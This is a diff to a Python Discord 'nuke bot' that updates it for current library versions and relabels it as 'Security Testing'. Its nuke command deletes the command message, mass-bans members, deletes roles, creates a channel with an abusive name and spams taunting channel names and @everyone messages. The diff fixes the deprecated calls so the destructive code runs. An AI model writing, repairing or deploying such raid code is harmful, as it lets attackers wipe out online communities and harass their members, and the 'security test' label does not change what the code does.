@@ -5,36 +5,46 @@ from discord import Permissions
 from colorama import Fore, Style
 import asyncio
 
-token = "𝐁𝐨𝐭_𝐓𝐨𝐤𝐞𝐧"
+token = "YOUR_BOT_TOKEN_HERE"  # Replace with your actual token
 
+SPAM_CHANNEL = ["YourName runs you", "Get ran", "YourName", "oops Beamed",
+                "YourName Beamed You", "Shoulda Listened", "Get beamed clowns",
+                "Beamed by YourName", "oops got nuked", "I run you",
+                "beamed by YourName", "I run you", "kinda got beamed by YourName"]
+SPAM_MESSAGE = ["@everyone Security Test in Progress"]
 
-SPAM_CHANNEL =  ["𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞 runs you" , "Get ran" , "𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞" , "oops Beamed","𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞 Beamed You","Shoulda Listened","Get beamed clowns","Beamed by 𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞","oops got nuked","I run you","beamed by 𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞","I run you","kinda got beamed by 𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞"]
-SPAM_MESSAGE = ["@everyone 𝐒𝐩𝐚𝐦_𝐌𝐞𝐬𝐬𝐚𝐠𝐞"]
+# ===== INTENTS CONFIGURATION =====
+intents = discord.Intents.default()
+intents.members = True          # Essential for banning/member-list features
+intents.guilds = True           # Essential for guild management (channels, roles)
+intents.message_content = True  # Essential for reading commands
 
-client = commands.Bot(command_prefix="𝐏𝐫𝐞𝐟𝐢𝐱_𝐀𝐫𝐞𝐚")
+# ===== BOT CREATION WITH INTENTS =====
+client = commands.Bot(command_prefix="!", intents=intents)
 
 
 @client.event
 async def on_ready():
    print(''' 
    
-███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
-████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝ 
-██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░ 
-██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░ 
-██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░  
-╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░ 
+███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
+████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝ 
+██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░ 
+██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░ 
+██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░  
+╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░ 
  ''')
-   await client.change_presence(activity=discord.Game(name="𝐁𝐨𝐭_𝐒𝐭𝐚𝐭𝐮𝐬"))
+   await client.change_presence(activity=discord.Game(name="Security Testing"))
+   print(f"{client.user.name} is now online!")
 
 @client.command()
 @commands.is_owner()
-async def 𝐁𝐨𝐭_𝐒𝐭𝐨𝐩(ctx):
-    await ctx.bot.logout()
-    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)
+async def stop(ctx):
+    await ctx.bot.close()  # Fixed: changed from logout() to close()
+    print(Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)
 
 @client.command()
-async def 𝐁𝐨𝐭_𝐍𝐮𝐤𝐞(ctx):
+async def nuke(ctx):
     await ctx.message.delete()
     guild = ctx.guild
     try:
@@ -52,9 +62,9 @@ async def 𝐁𝐨𝐭_𝐍𝐮𝐤𝐞(ctx):
     for member in guild.members:
      try:
        await member.ban()
-       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
+       print(Fore.MAGENTA + f"{member.name} Was banned" + Fore.RESET)
      except:
-       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
+       print(Fore.GREEN + f"{member.name} Was unable to be banned." + Fore.RESET)
     for role in guild.roles:
      try:
        await role.delete()
@@ -71,10 +81,10 @@ async def 𝐁𝐨𝐭_𝐍𝐮𝐤𝐞(ctx):
     for ban_entry in banned_users:
       user = ban_entry.user
       try:
-        await user.unban("𝐘𝐨𝐮𝐫_𝐔𝐬𝐞𝐫")
-        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
+        await guild.unban(user, reason="Security Test")  # Fixed: correct unban syntax
+        print(Fore.MAGENTA + f"{user.name} Was successfully unbanned." + Fore.RESET)
       except:
-        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
+        print(Fore.GREEN + f"{user.name} Was not unbanned." + Fore.RESET)
     await guild.create_text_channel("NUKED BITCH")
     for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
